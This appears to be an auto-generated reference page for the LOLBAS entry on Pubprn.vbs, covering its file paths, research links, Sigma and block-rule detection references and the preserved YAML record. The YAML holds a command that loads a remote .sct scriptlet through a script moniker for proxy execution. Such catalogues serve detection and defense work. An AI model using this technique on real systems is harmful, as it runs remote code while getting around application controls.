---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Pubprn.vbs

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `pubprn.vbs` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Pubprn.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Pubprn.vbs](../../tools/windows/pubprn.vbs.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | pubprn.vbs |
| name | Pubprn.vbs |
| type | tool |
| source | lolbas |
| url | https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/ |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@enigma0x3'
  Person: Matt Nelson
Author: Oddvar Moe
Code_Sample:
- Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Pubprn_calc.sct
Commands:
- Category: Execute
  Command: pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
  Description: Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection
  MitreID: T1216.001
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: SCT
  Usecase: Proxy execution
Created: 2018-05-25
Description: Proxy execution with Pubprn.vbs
Detection:
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- Sigma: https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml
Full_Path:
- Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
- Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
Name: Pubprn.vbs
Resources:
- Link: https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
- Link: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
- Link: https://github.com/enigma0x3/windows-operating-system-archaeology
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Pubprn.yml
```

## Detection / Analysis Notes

```text
BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml
```

```text
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- Sigma: https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml
```
